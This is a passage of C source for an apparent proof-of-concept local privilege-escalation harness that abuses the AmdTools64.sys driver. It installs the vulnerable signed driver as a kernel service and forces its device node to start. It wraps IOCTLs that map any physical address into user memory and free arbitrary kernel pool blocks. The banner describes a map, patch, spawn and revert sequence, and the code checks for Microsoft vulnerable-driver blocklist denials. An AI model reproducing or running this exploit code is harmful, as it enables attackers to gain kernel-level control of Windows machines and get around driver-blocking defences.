typedef struct _PTEARREQ {
    UINT64 pad[3];   /* +0x00..+0x17: unused by the worker           */
    UINT64 userVa;   /* +0x18 in : view to unmap (0 skips the unmap) */
    UINT64 mdl;      /* +0x20 in : MDL to free (0 -> status 5)       */
    UINT32 pad2;     /* +0x28                                        */
    WORD   status;   /* +0x2C out: 0 whenever mdl != 0               */
} PTEARREQ, *PPTEARREQ;
#pragma pack(pop)
C_ASSERT(sizeof(PAGEALLOCREQ) == 0x2E);
C_ASSERT(sizeof(PTEARREQ) == 0x2E);

/* 0x30-byte request/reply copied into the METHOD_BUFFERED SystemBuffer.
 * Layout verified in sub_140002090 (map) and sub_140002CB8 (unmap). */
#pragma pack(push, 1)
typedef struct _DEVREQ {
    UINT64 mapPa;    /* +0x00 map: physical address (fully attacker controlled) */
    UINT32 mapLen;   /* +0x08 map: byte count                                   */
    UINT32 status;   /* +0x0C reply: 0 ok / 5 resources / 6 invalid length      */
    UINT64 block;    /* +0x10 reply map / input unmap: kernel pool handle       */
    UINT64 userVa;   /* +0x18 reply: user-mode VA of the mapping                */
    UINT8  cache;    /* +0x20 map: 0 noncached, 1 cached, 2 write-combined      */
    UINT8  tail[0x0F]; /* pad out to 0x30 */
} DEVREQ;
#pragma pack(pop)
C_ASSERT(sizeof(DEVREQ) == 0x30);
#define TRANS_IN_LEN  (DWORD)sizeof(DEVREQ)

static HANDLE g_dev = INVALID_HANDLE_VALUE;

/* ---- teelogging: every message goes to the console AND to a .log file ---- */
static FILE *g_log;

static void Emit(const wchar_t *line)
{
    size_t n = line ? wcslen(line) : 0;

    /* console and log file always get byte-identical content */
    fputws(line ? line : L"", stdout);
    if (n && line[n - 1] != L'\n')
        fputws(L"\n", stdout);
    if (g_log) {
        fputws(line ? line : L"", g_log);
        if (n && line[n - 1] != L'\n')
            fputws(L"\n", g_log);
        fflush(g_log);
    }
}

static void LogW(const wchar_t *fmt, ...)
{
    wchar_t buf[1024];
    va_list ap;
    va_start(ap, fmt);
    vswprintf(buf, 1023, fmt, ap);
    va_end(ap);
    buf[1023] = 0;
    Emit(buf);
}

static void LogA(const char *fmt, ...)
{
    char a[768];
    wchar_t w[1024];
    size_t i, n = 0;
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(a, sizeof(a), fmt, ap);
    va_end(ap);
    a[sizeof(a) - 1] = 0;
    for (i = 0; a[i] && n < 1023; i++)
        w[n++] = (wchar_t)(unsigned char)a[i];
    w[n] = 0;
    Emit(w);
}

/* ---- v1.8 proof log: WriteFile + FlushFileBuffers. The P2a null probe
 * showed stdio fflush only reaches RAM -- the NTFS dirty pages for the
 * teelog died with the bugcheck and the whole run's lines were lost. This
 * path forces the OS to commit proof lines to disk immediately, so the
 * evidence survives a crash seconds later. Written as UTF-8. ---- */
static HANDLE g_proof;

static void ProofOpen(void)
{
    wchar_t path[640], *slash;

    if (g_proof)
        return;
    if (!GetModuleFileNameW(NULL, path, 600))
        return;
    slash = wcsrchr(path, L'\\');
    if (!slash)
        return;
    wcscpy(slash + 1, L"amd_esc_poc.proof");
    g_proof = CreateFileW(path, GENERIC_WRITE, FILE_SHARE_READ, NULL,
                         OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (g_proof == INVALID_HANDLE_VALUE)
        g_proof = NULL;
    else
        SetFilePointer(g_proof, 0, NULL, FILE_END);
}

static void ProofLog(const wchar_t *fmt, ...)
{
    wchar_t wbuf[1024];
    char    abuf[2100];
    DWORD   wr2 = 0;
    int     n;
    va_list ap;
    SYSTEMTIME tm;

    va_start(ap, fmt);
    vswprintf(wbuf, 1022, fmt, ap);
    va_end(ap);
    wcscat(wbuf, L"\r\n");
    GetLocalTime(&tm);
    ProofOpen();
    if (!g_proof)
        return;
    /* timestamped prefix line: [hh:mm:ss.mmm] */
    {
        char pre[40];
        int  m = sprintf(pre, "[%02u:%02u:%02u.%03u] ",
                         tm.wHour, tm.wMinute, tm.wSecond, tm.wMilliseconds);
        WriteFile(g_proof, pre, m, &wr2, NULL);
    }
    n = WideCharToMultiByte(CP_UTF8, 0, wbuf, -1, abuf, sizeof(abuf), NULL, NULL);
    if (n > 1) {
        WriteFile(g_proof, abuf, n - 1, &wr2, NULL);
        FlushFileBuffers(g_proof);
    }
}

static void OpenTeelog(void)
{
    wchar_t path[640], *slash;
    SYSTEMTIME st;

    if (!GetModuleFileNameW(NULL, path, 512)) {
        fputws(L"[!] cannot resolve exe path for teelogging -- console only\n", stdout);
        return;
    }
    path[639] = 0;
    slash = wcsrchr(path, L'\\');
    if (!slash) {
        fputws(L"[!] exe path has no directory part -- teelogging disabled\n", stdout);
        return;
    }
    if ((size_t)(slash - path) + sizeof(L"\\amd_esc_poc.log") / sizeof(WCHAR) >= 640) {
        fputws(L"[!] exe path too long for teelogging -- console only\n", stdout);
        return;
    }
    wcscpy(slash + 1, L"amd_esc_poc.log");
    /* append across runs; first open fixes the encoding to UTF-8 */
    g_log = _wfopen(path, L"a, ccs=UTF-8");
    if (!g_log) {
        fputws(L"[!] could not open amd_esc_poc.log next to the exe (dir read-only?) -- console only\n", stdout);
        return;
    }
    GetLocalTime(&st);
    LogW(L"---- log opened %04u-%02u-%02u %02u:%02u:%02u", st.wYear, st.wMonth, st.wDay,
         st.wHour, st.wMinute, st.wSecond);
    LogW(L"    cmdline . %ls", GetCommandLineW());
    LogW(L"    teelog .. %ls", path);
}

static void DiagnoseInterface(const WCHAR *iface);

static const wchar_t DASHES[] =
    L"--------------------------------------------------------------";

static void PrintBanner(void)
{
    LogW(L"");
    LogW(L"  +==========================================================================+");
    LogW(L"    %ls  //  %ls  %ls", TOOL_BRAND, TOOL_TITLE, TOOL_VERSION);
    LogW(L"    AmdTools64.sys physmap escalation harness -- map -> patch -> verify -> spawn -> revert");
    LogW(L"    every free page is a ticket, and MmMapLockedPages sells them");
    LogW(L"  +==========================================================================+");
}

/* visual section header: "  ---- title -------------" padded to a fixed width */
static void Section(const wchar_t *title)
{
    size_t n = title ? wcslen(title) : 0;
    int pad;

    LogW(L"");
    if (n < 44) {
        pad = (int)(44 - n);
        LogW(L"  ---- %ls %.*ls", title, pad, DASHES);
    } else {
        LogW(L"  ---- %ls", title);
    }
}

/*
 * Authoritative fallback: SetupAPI enumeration. Answers "does ANY device that
 * is present right now expose interface {GUID}?" with descriptions and status.
 */
static BOOL EnumerateInterfaceDevices(HANDLE *hOut)
{
    static GUID g = DEVICE_IFACE_GUID;
    HDEVINFO h;
    DWORD i;

    h = SetupDiGetClassDevsW(&g, NULL, NULL, DIGCF_DEVICEINTERFACE | DIGCF_PRESENT);
    if (h == INVALID_HANDLE_VALUE) {
        LogW(L"[!] SetupDiGetClassDevs failed GLE=%lu", GetLastError());
        return FALSE;
    }

    for (i = 0;; i++) {
        SP_DEVICE_INTERFACE_DATA ifd;
        SP_DEVINFO_DATA did;
        BYTE buf[1600];
        SP_DEVICE_INTERFACE_DETAIL_DATA_W *det = (SP_DEVICE_INTERFACE_DETAIL_DATA_W *)buf;
        ULONG st = 0, pr = 0;
        WCHAR desc[256];

        ZeroMemory(&ifd, sizeof(ifd));
        ifd.cbSize = sizeof(ifd);
        if (!SetupDiEnumDeviceInterfaces(h, NULL, &g, i, &ifd)) {
            if (GetLastError() == ERROR_NO_MORE_ITEMS) {
                if (i == 0)
                    LogW(L"[x] SetupAPI: ZERO present devices expose interface "
                         L"{1232175B-1C34-41FD-B101-342D47B828AC} -- no live "
                         L"interface at all (devnode absent/phantom, or its "
                         L"driver never loaded)");
                break;
            }
            LogW(L"[!] SetupDiEnumDeviceInterfaces failed GLE=%lu", GetLastError());
            break;
        }

        det->cbSize = offsetof(SP_DEVICE_INTERFACE_DETAIL_DATA_W, DevicePath);
        ZeroMemory(&did, sizeof(did));
        did.cbSize = sizeof(did);
        if (!SetupDiGetDeviceInterfaceDetailW(h, &ifd, det, sizeof(buf), NULL, &did)) {
            LogW(L"[!] SetupDiGetDeviceInterfaceDetail failed GLE=%lu", GetLastError());
            continue;
        }

        LogW(L"[+] SetupAPI interface[%lu]: %ls", (unsigned long)i, det->DevicePath);
        if (SetupDiGetDeviceRegistryPropertyW(h, &did, SPDRP_DEVICEDESC, NULL,
                                              (BYTE *)desc, sizeof(desc), NULL))
            LogW(L"      device: %ls", desc);
        if (CM_Get_DevNode_Status(&st, &pr, did.DevInst, 0) == CR_SUCCESS)
            LogW(L"      devnode status=0x%08lX problem=%lu %ls%ls", st, pr,
                 (st & DN_STARTED) ? L"STARTED" : L"NOT_STARTED",
                 (st & DN_HAS_PROBLEM) ? L" HAS_PROBLEM" : L"");

        *hOut = CreateFileW(det->DevicePath, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (*hOut != INVALID_HANDLE_VALUE)
            return TRUE;
        LogW(L"[!] CreateFileW on it failed GLE=%lu", GetLastError());
    }

    SetupDiDestroyDeviceInfoList(h);
    return FALSE;
}

/*
 * CM returns a REG_MULTI_SZ of registered interface paths (PRESENT = devices
 * currently in the tree). Entries can be EMPTY strings for phantom/stale
 * registrations, so walk all entries, skip empties, try each.
 */
static BOOL OpenDeviceByInterface(HANDLE *hOut)
{
    static GUID g = DEVICE_IFACE_GUID;
    WCHAR list[2048];
    ULONG len = (ULONG)(sizeof(list) / sizeof(list[0]));
    unsigned idx = 0;
    const WCHAR *s;
    CONFIGRET cr;

    cr = CM_Get_Device_Interface_ListW(&g, NULL, list,
                                       len, CM_GET_DEVICE_INTERFACE_LIST_PRESENT);
    if (cr != CR_SUCCESS) {
        LogW(L"[!] no device interface {1232175B-1C34-41FD-B101-342D47B828AC} present "
             L"(driver loaded? AMD hardware attached?) (CR=0x%08X)", cr);
        return FALSE;
    }

    for (s = list; *s; idx++) {
        LogW(L"[+] interface[%u]: %ls", idx, s);
        *hOut = CreateFileW(s, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (*hOut != INVALID_HANDLE_VALUE)
            return TRUE;
        {
            DWORD gle = GetLastError();
            LogW(L"[!] CreateFileW failed GLE=%lu%s", gle,
                 gle == 3 ? L" (ERROR_PATH_NOT_FOUND: interface registered but symbolic link not live -> device not started)"
                          : (gle == 5 ? L" (ACCESS_DENIED -- need Administrator/SYSTEM)" : L""));
            if (gle == 3)
                DiagnoseInterface(s);
        }
        s += wcslen(s) + 1;
    }

    LogW(L"[i] CM PRESENT interface list has no live path: the devnode is\n"
         L"    absent, phantom, or not started. This is the exact signature of\n"
         L"    the v1.1 raw-registry install (PnP never reports a hand-written\n"
         L"    Enum\\Root key as PRESENT). Re-run with --install to create the\n"
         L"    devnode through the CM APIs.");
    return EnumerateInterfaceDevices(hOut);
}

#ifndef DN_STARTED
#define DN_STARTED      0x00000008
#endif
#ifndef DN_HAS_PROBLEM
#define DN_HAS_PROBLEM  0x00000400
#endif
#ifndef CM_DRP_DRIVER
#define CM_DRP_DRIVER   0x00000009
#endif

/* Device Manager "Code N" == decimal CM problem code */
static const struct { ULONG c; const WCHAR *n; } g_problemCodes[] = {
    { 1,  L"Code 1: device not configured correctly (misconfigured)" },
    { 10, L"Code 10: device cannot start" },
    { 22, L"Code 22: device disabled (Device Manager)" },
    { 24, L"Code 24: device not working / not started" },
    { 28, L"Code 28: drivers not installed for this device" },
    { 31, L"Code 31: device not working, cause unknown" },
    { 39, L"Code 39: driver failed to load (corrupt/missing/blocked)" },
    { 45, L"Code 45: device not connected / phantom devnode" },
    { 52, L"Code 52: driver blocked from loading -- signature / code integrity"
           L" (a Microsoft vulnerable-driver-blocklist denial of a properly"
           L" signed driver shows up here on HVCI systems)" },
};

/*
 * GLE=3 (ERROR_PATH_NOT_FOUND) on a device-interface path means the interface
 * is registered in the registry but its symbolic link is not live: the owning
 * devnode is present but not started (the driver enables the interface only
 * after IRP_MN_START_DEVICE succeeds -- sub_140004390 @0x1400044cf).
 * CM still lists interfaces of devices that are merely present, so decode the
 * devnode instance out of the path and report its status/problem/bound driver.
 */
static void DiagnoseInterface(const WCHAR *iface)
{
    WCHAR id[512], drv[200];
    const WCHAR *p, *q;
    ULONG n = 0;
    DEVINST dn;
    ULONG st = 0, pr = 0;
    ULONG sz = sizeof(drv);
    CONFIGRET cr;
    unsigned i;

    if (!iface || !*iface) {   /* empty path: CM_Locate_DevNode would "succeed" on the root devnode */
        LogW(L"[!] interface path is EMPTY (phantom/stale registration -- device no longer present)");
        return;
    }

    p = iface;
    if (!_wcsnicmp(p, L"\\\\?\\", 4))
        p += 4;
    for (q = p; *q && *q != L'{' && n < 508; q++)
        id[n++] = (*q == L'#') ? L'\\' : *q;
    id[n] = 0;

    if (CM_Locate_DevNodeW(&dn, id, CM_LOCATE_DEVNODE_NORMAL) != CR_SUCCESS) {
        LogW(L"[!] devnode '%ls' is not in the device tree "
                         L"(hardware that binds this interface is NOT present on this machine)\n", id);
        return;
    }
    LogW(L"[i] devnode: %ls\n", id);

    cr = CM_Get_DevNode_Status(&st, &pr, dn, 0);
    if (cr != CR_SUCCESS) {
        LogW(L"[!] CM_Get_DevNode_Status CR=0x%X\n", cr);
        return;
    }
    LogW(L"[i] status=0x%08lX problem=0x%08lX (%lu)%ls%ls\n",
             (unsigned long)st, (unsigned long)pr, (unsigned long)pr,
             (st & DN_STARTED) ? L" STARTED" : L" NOT_STARTED",
             (st & DN_HAS_PROBLEM) ? L" HAS_PROBLEM" : L"");
    if (st & DN_HAS_PROBLEM)
        for (i = 0; i < sizeof(g_problemCodes) / sizeof(g_problemCodes[0]); i++)
            if (g_problemCodes[i].c == pr) {
                LogW(L"[i] meaning: %ls\n", g_problemCodes[i].n);
                break;
            }

    if (CM_Get_DevNode_Registry_PropertyW(dn, CM_DRP_DRIVER, NULL, drv, &sz, 0) == CR_SUCCESS)
        LogW(L"[i] bound driver service: %ls\n", drv);
    else
        LogW(L"[i] no driver service bound to this devnode (INF not installed/matched)\n");
}

/* ---- install: the working load path (v1.2) ------------------------------- */

/* AmdTools64.sys is expected next to this exe */
static BOOL PathOfDriver(WCHAR *out, size_t cch)
{
    WCHAR path[640], *slash;

    if (!GetModuleFileNameW(NULL, path, 512))
        return FALSE;
    slash = wcsrchr(path, L'\\');
    if (!slash)
        return FALSE;
    slash[1] = 0;
    if (wcslen(path) + 16 >= cch)
        return FALSE;
    wcscpy(out, path);
    wcscat(out, L"AmdTools64.sys");
    return TRUE;
}

/* step 1: kernel service whose ImagePath is our AmdTools64.sys */
static BOOL EnsureService(const WCHAR *sysPath)
{
    SC_HANDLE scm, svc;

    scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scm) {
        LogW(L"[!] OpenSCManagerW failed GLE=%lu (run elevated)\n", GetLastError());
        return FALSE;
    }
    svc = CreateServiceW(scm, AUDIT_SVC, AUDIT_SVC, SERVICE_ALL_ACCESS,
                         SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
                         SERVICE_ERROR_NORMAL, sysPath,
                         NULL, NULL, NULL, NULL, NULL);
    if (svc) {
        LogW(L"[+] kernel service %ls created (binPath=%ls)\n", AUDIT_SVC, sysPath);
    } else if (GetLastError() == ERROR_SERVICE_EXISTS) {
        LogW(L"[=] kernel service %ls already exists, reusing\n", AUDIT_SVC);
        svc = OpenServiceW(scm, AUDIT_SVC, SERVICE_ALL_ACCESS);
    } else {
        LogW(L"[!] CreateServiceW failed GLE=%lu\n", GetLastError());
        CloseServiceHandle(scm);
        return FALSE;
    }
    if (!svc) {
        LogW(L"[!] OpenServiceW(%ls) failed GLE=%lu\n", AUDIT_SVC, GetLastError());
        CloseServiceHandle(scm);
        return FALSE;
    }
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return TRUE;
}

/* minimal function-driver INF next to the .sys, devcon-style. Catalog-less,
 * so driver-store staging may reject it -- fine: the CM_DRP_SERVICE bind is
 * what actually loads the driver; the INF just lets PnP fill Class/Driver. */
static BOOL WriteInf(const WCHAR *infPath, const WCHAR *sysPath)
{
    char inf[2048], sysA[1040];
    int n;
    HANDLE f;
    DWORD written = 0;
    BOOL ok;

    if (!WideCharToMultiByte(CP_ACP, 0, sysPath, -1, sysA, sizeof(sysA), NULL, NULL))
        return FALSE;
    n = snprintf(inf, sizeof(inf),
        "[Version]\r\n"
        "Signature=\"$WINDOWS NT$\"\r\n"
        "Class=System\r\n"
        "ClassGuid={4D36E97D-E325-11CE-BFC1-08002BE10318}\r\n"
        "Provider=%%AMD%%\r\n"
        "DriverVer=10/15/2026,1.0.0.1\r\n"
        "\r\n"
        "[Manufacturer]\r\n"
        "%%AMD%%=AMD,NTamd64\r\n"
        "\r\n"
        "[AMD.NTamd64]\r\n"
        "%%DevDesc%%=AmdToolsAudit.Install,Root\\AMDTOOLSAUDIT\r\n"
        "\r\n"
        "[AmdToolsAudit.Install]\r\n"
        "\r\n"
        "[AmdToolsAudit.Install.Services]\r\n"
        "AddService=AMDTOOLS64,0x00000002,AmdToolsAudit.Service\r\n"
        "\r\n"
        "[AmdToolsAudit.Service]\r\n"
        "ServiceType=1\r\n"
        "StartType=3\r\n"
        "ErrorControl=1\r\n"
        "ServiceBinary=%s\r\n"
        "\r\n"
        "[Strings]\r\n"
        "AMD=\"AMD\"\r\n"
        "DevDesc=\"AmdTools64 audit devnode\"\r\n",
        sysA);
    if (n <= 0 || (size_t)n >= sizeof(inf))
        return FALSE;
    f = CreateFileW(infPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                    FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) {
        LogW(L"[!] CreateFileW(%ls) failed GLE=%lu\n", infPath, GetLastError());
        return FALSE;
    }
    ok = WriteFile(f, inf, (DWORD)n, &written, NULL) && written == (DWORD)n;
    CloseHandle(f);
    return ok;
}

/* steps 2-5: create the devnode, bind the service, start it. Self-heals over
 * the v1.1 reg.exe leftover (a phantom devnode under the same instance ID). */
/* fresh root devnodes only rise on an enumeration event (boot, DMR refresh,
 * CM_Reenumerate_DevNode); force a synchronous scan of the tree root.
 * CM_Get_Root_DevNode is missing from the mingw header and import lib --
 * resolve it at runtime (W then A), falling back to the root's well-known
 * device-instance id "HTREE\ROOT\0" via CM_Locate_DevNodeW.
 * returns 0 ok / -1 root unreachable / -2 reenumeration failed */
static int ForceRootRescan(void)
{
    DEVINST root = 0;

    if (!get_root_devnode) {
        HMODULE cm = GetModuleHandleW(L"cfgmgr32.dll");
        if (cm) {
            get_root_devnode = (void *)GetProcAddress(cm, "CM_Get_Root_DevNodeW");
            if (!get_root_devnode)
                get_root_devnode = (void *)GetProcAddress(cm, "CM_Get_Root_DevNodeA");
        }
    }
    if (!(get_root_devnode && get_root_devnode(&root, 0) == CR_SUCCESS) &&
        CM_Locate_DevNodeW(&root, (DEVINSTID_W)L"HTREE\\ROOT\\0", 0) != CR_SUCCESS)
        return -1;
    return CM_Reenumerate_DevNode(root, CM_REENUMERATE_SYNCHRONOUS) == CR_SUCCESS
        ? 0 : -2;
}

static BOOL InstallAndStart(void)
{
    WCHAR sysPath[640], infPath[640];
    DEVINST parent = 0, dev = 0;
    CONFIGRET cr;
    BOOL reboot = FALSE;

    if (!PathOfDriver(sysPath, sizeof(sysPath) / sizeof(sysPath[0]))) {
        LogW(L"[!] cannot resolve AmdTools64.sys next to this exe\n");
        return FALSE;
    }
    LogW(L"[*] driver image: %ls\n", sysPath);

    if (!EnsureService(sysPath))
        return FALSE;

    if (CM_Locate_DevNodeW(&parent, NULL, CM_LOCATE_DEVNODE_NORMAL) != CR_SUCCESS) {
        LogW(L"[!] CM_Locate_DevNodeW(root) failed\n");
        return FALSE;
    }

    cr = CM_Create_DevNodeW(&dev, (DEVINSTID_W)AUDIT_NODE, parent, CM_CREATE_DEVNODE_NORMAL);
    if (cr == CR_SUCCESS) {
        LogW(L"[+] devnode %ls created via CM_Create_DevNodeW\n", AUDIT_NODE);
    } else {
        /* leftover from a v1.1 raw-reg install is a PHANTOM: present in the
         * registry, never reported present. Wipe the stale key and retry. */
        cr = CM_Locate_DevNodeW(&dev, (DEVINSTID_W)AUDIT_NODE, CM_LOCATE_DEVNODE_PHANTOM);
        if (cr == CR_SUCCESS && RegDeleteTreeW(HKEY_LOCAL_MACHINE,
                    L"SYSTEM\\CurrentControlSet\\Enum\\Root\\AMDTOOLSAUDIT") == ERROR_SUCCESS) {
            LogW(L"[=] wiped stale v1.1 Enum\\Root\\AMDTOOLSAUDIT key (phantom devnode)\n");
            cr = CM_Create_DevNodeW(&dev, (DEVINSTID_W)AUDIT_NODE, parent, CM_CREATE_DEVNODE_NORMAL);
        }
        if (cr == CR_SUCCESS)
            LogW(L"[+] devnode %ls created via CM_Create_DevNodeW\n", AUDIT_NODE);
        else if (CM_Locate_DevNodeW(&dev, (DEVINSTID_W)AUDIT_NODE, CM_LOCATE_DEVNODE_NORMAL) == CR_SUCCESS)
            LogW(L"[=] devnode %ls already present, reusing\n", AUDIT_NODE);
        else {
            LogW(L"[!] cannot create/locate devnode %ls (CR=0x%X)\n", AUDIT_NODE, cr);
            return FALSE;
        }
    }

    if (CM_Add_IDW(dev, (DEVINSTID_W)AUDIT_HWID, CM_ADD_ID_HARDWARE) != CR_SUCCESS)
        LogW(L"[!] CM_Add_IDW failed (non-fatal)\n");

    cr = CM_Set_DevNode_Registry_PropertyW(dev, CM_DRP_SERVICE,
                                           (PVOID)AUDIT_SVC,
                                           sizeof(AUDIT_SVC), 0);
    if (cr != CR_SUCCESS) {
        LogW(L"[!] CM_Set_DevNode_Registry_PropertyW(SERVICE) CR=0x%X\n", cr);
        return FALSE;
    }
    LogW(L"[+] devnode bound to service %ls\n", AUDIT_SVC);

    /* INF install: prefer the genuine WHQL-signed package (amdtools.inf +
     * AmdTools.cat beside the driver image) -- with its catalog present the
     * driver store accepts the stage and UDPD installs it onto the matched
     * devnode (*AMDTOOLSDEV), writing Service/class/desc/device-SDDL from the
     * vendor INF. Our generated catalog-less INF is only a fallback and will
     * be rejected by the store (0xE000022F). */
    {
        WCHAR genPath[640];
        WCHAR *slash;
        const WCHAR *useInf;
        wcscpy(genPath, sysPath);
        slash = wcsrchr(genPath, L'\\');
        if (slash)
            *++slash = 0;
        wcscat(genPath, L"amdtools.inf");
        useInf = genPath;
        if (GetFileAttributesW(genPath) == INVALID_FILE_ATTRIBUTES) {
            wcscpy(infPath, sysPath);
            wcscpy(infPath + wcslen(infPath) - 4, L".inf");
            if (!WriteInf(infPath, sysPath)) {
                LogW(L"[!] WriteInf FAILED (GLE=%lu) -- INF not written\n",
                     GetLastError());
                infPath[0] = 0;
                useInf = NULL;
            } else
                useInf = infPath;
            LogW(L"[=] genuine package INF not found -- generated fallback INF\n");
        }
        if (useInf) {
            LogW(L"[*] UDPD INF target: %ls (attrib=0x%08X)\n", useInf,
                 GetFileAttributesW(useInf));
            if (UpdateDriverForPlugAndPlayDevicesW(NULL, AUDIT_HWID, useInf,
                                                  INSTALLFLAG_FORCE, &reboot))
                LogW(L"[+] INF bound to devnode%s\n",
                     reboot ? L" (reboot required)" : L"");
            else
                LogW(L"[=] UpdateDriverForPlugAndPlayDevices rejected (GLE=%lu), "
                     L"continuing on the CM_DRP_SERVICE bind\n", GetLastError());
        }
    }

    cr = CM_Setup_DevNode(dev, CM_SETUP_DEVNODE_READY);
    if (cr != CR_SUCCESS) {
        LogW(L"[!] CM_Setup_DevNode(READY) CR=0x%X -- devnode did not start\n", cr);
        return FALSE;
    }
    /* a freshly created root devnode only becomes PRESENT on an enumeration
     * event (boot, Device Manager refresh, CM_Reenumerate_DevNode) --
     * Setup_DevNode(READY) marks it startable, it does not enumerate it.
     * Without this the node sits unstarted with problem=0 and no DN bits. */
    int rr = ForceRootRescan();
    if (rr == 0)
        LogW(L"[+] CM_Setup_DevNode(READY) + synchronous root rescan: ok\n");
    else
        LogW(L"[!] Setup_DevNode(READY) ok, but the root rescan FAILED "
             L"(rc=%d) -- the devnode will not be enumerated; run "
             L"'pnputil /scan-devices' manually as fallback\n", rr);
    return TRUE;
}

/* quiet probe: is the interface live RIGHT NOW? (no logging on miss) */
static BOOL ProbeInterface(HANDLE *hOut, WCHAR *pathOut)
{
    static GUID g = DEVICE_IFACE_GUID;
    WCHAR path[1024];

    if (CM_Get_Device_Interface_ListW(&g, NULL, path,
            (ULONG)(sizeof(path) / sizeof(path[0])),
            CM_GET_DEVICE_INTERFACE_LIST_PRESENT) != CR_SUCCESS)
        return FALSE;
    if (!*path)
        return FALSE;
    *hOut = CreateFileW(path, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (*hOut == INVALID_HANDLE_VALUE)
        return FALSE;
    if (pathOut)
        wcscpy(pathOut, path);
    return TRUE;
}

/* interface enable can lag CM_Setup_DevNode by a moment: poll for it */
static BOOL OpenDeviceWait(HANDLE *hOut, DWORD totalMs)
{
    WCHAR path[1024];
    DWORD waited;

    for (waited = 0; waited < totalMs; waited += 250) {
        if (ProbeInterface(hOut, path)) {
            LogW(L"[+] device interface live: %ls\n", path);
            return TRUE;
        }
        Sleep(250);
    }
    return FALSE;
}

/*
 * Nothing opened: surface WHY. Distinguishes (a) install never ran (no
 * service / no devnode), (b) phantom devnode (the v1.1 raw-reg signature),
 * (c) devnode present with a problem code -- i.e. the driver image was
 * denied at load (signature/CI; a vulnerable-driver-blocklist denial of a
 * properly signed driver on an HVCI machine lands here), (d) everything
 * fine but the interface is not enabled yet.
 */
static void DiagnoseAuditDevnode(void)
{
    SC_HANDLE scm, svc;
    SERVICE_STATUS ss;
    DEVINST dn = 0;
    ULONG st = 0, pr = 0;
    CONFIGRET cr;
    unsigned i;

    scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) {
        LogW(L"[!] OpenSCManagerW failed GLE=%lu (run elevated)\n", GetLastError());
    } else {
        svc = OpenServiceW(scm, AUDIT_SVC, SERVICE_QUERY_STATUS);
        if (!svc) {
            LogW(L"[!] kernel service %ls does not exist -- install step was "
                 L"never run\n", AUDIT_SVC);
        } else {
            if (QueryServiceStatus(svc, &ss))
                LogW(L"[i] service %ls present (state=%lu)\n", AUDIT_SVC, ss.dwCurrentState);
            CloseServiceHandle(svc);
        }
        CloseServiceHandle(scm);
    }

    cr = CM_Locate_DevNodeW(&dn, (DEVINSTID_W)AUDIT_NODE, CM_LOCATE_DEVNODE_NORMAL);
    if (cr != CR_SUCCESS) {
        if (CM_Locate_DevNodeW(&dn, (DEVINSTID_W)AUDIT_NODE, CM_LOCATE_DEVNODE_PHANTOM) == CR_SUCCESS)
            LogW(L"[!] devnode %ls is PHANTOM: registry keys exist but PnP never\n"
                 L"    reported it present -- v1.1 raw-registry install signature;\n"
                 L"    the driver was never loaded\n", AUDIT_NODE);
        else
            LogW(L"[!] devnode %ls does not exist -- install was never run\n", AUDIT_NODE);
        return;
    }

    if (CM_Get_DevNode_Status(&st, &pr, dn, 0) != CR_SUCCESS) {
        LogW(L"[!] CM_Get_DevNode_Status failed on %ls\n", AUDIT_NODE);
        return;
    }
    LogW(L"[i] devnode %ls: status=0x%08lX problem=%lu%s%s\n", AUDIT_NODE,
         (unsigned long)st, (unsigned long)pr,
         (st & DN_STARTED) ? L" STARTED" : L" NOT_STARTED",
         (st & DN_HAS_PROBLEM) ? L" HAS_PROBLEM" : L"");
    for (i = 0; i < sizeof(g_problemCodes) / sizeof(g_problemCodes[0]); i++)
        if (g_problemCodes[i].c == pr) {
            LogW(L"[i] meaning: %ls\n", g_problemCodes[i].n);
            break;
        }
    if (!(st & DN_STARTED) || (st & DN_HAS_PROBLEM)) {
        LogW(L"[i] if the problem is load-time code integrity, confirm with:\n"
             L"      wevtutil qe Microsoft-Windows-CodeIntegrity /c:20 /rd:true /f:text\n"
             L"    (HVCI enables the Microsoft vulnerable-driver blocklist; a listed\n"
             L"    driver is denied at image load even though it is properly signed)\n");
    }
}

/* map `pa` for `bytes` via command 0xFFF028A4; reply fields come from the
 * 0x21-byte copy-back into `reply` (status@+0x0C block@+0x10 userVa@+0x18) */
static BOOL DevCmdMap(UINT64 pa, UINT32 bytes, UINT8 cache, DEVREQ *reply)
{
    DEVREQ out;
    DWORD br = 0;

    ZeroMemory(&out, sizeof(out));
    reply->mapPa   = pa;
    reply->mapLen  = bytes;
    reply->cache   = cache;
    reply->status  = 0;
    reply->block   = 0;
    reply->userVa  = 0;
    if (!DeviceIoControl(g_dev, CMD_MAP, (LPVOID)reply, TRANS_IN_LEN,
                         (LPVOID)&out, TRANS_OUT_LEN, &br, NULL))
        return FALSE;
    *reply = out;
    return TRUE;
}

/* companion 0xFFF028A8: unmap user mapping, free MDL + 'ADIO' pool block.
 * sub_140002CB8 validates NOTHING about `block` (no handle tracking, no
 * consumed state, always replies status 0) and frees it with tag 0 even
 * though the allocation used tag 'ADIO'. */
static BOOL DevCmdUnmap(UINT64 block, UINT32 *statusOut)
{
    DEVREQ req, out;
    DWORD br = 0;

    ZeroMemory(&req, sizeof(req));
    ZeroMemory(&out, sizeof(out));
    req.block = block;      /* the handle map returned at req+0x10 ... or any value */
    if (!DeviceIoControl(g_dev, CMD_UNMAP, (LPVOID)&req, TRANS_IN_LEN,
                         (LPVOID)&out, TRANS_OUT_LEN, &br, NULL))
        return FALSE;
    if (statusOut)
        *statusOut = out.status;    /* the worker unconditionally writes 0 here */
    return TRUE;
}

/* classic 16-byte rows: hex + ASCII gutter, one fully-assembled line per row */
static void Dump(UINT64 va, UINT32 bytes)
{
    const UINT8 *p = (const UINT8 *)(uintptr_t)va;
    UINT32 o;

    for (o = 0; o < bytes; o += 16) {
